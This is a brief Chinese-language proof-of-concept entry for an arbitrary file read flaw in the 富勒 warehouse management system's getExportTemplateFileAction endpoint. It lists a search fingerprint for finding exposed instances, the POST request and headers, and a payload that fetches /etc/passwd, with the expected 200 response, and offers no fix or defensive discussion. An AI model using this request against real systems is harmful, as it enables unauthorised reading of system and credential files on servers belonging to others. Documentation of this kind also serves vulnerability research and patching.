# 富勒仓储系统getExportTemplateFileAction存在任意文件读取漏洞

- **系统**：富勒仓储系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/logincenterapp/ValidateImageService"`
- **请求**：`POST /expcenter/getExportTemplateFileAction HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
dowmLoadUrl=/etc/passwd&fileName=
```
- **预期**：200　|　—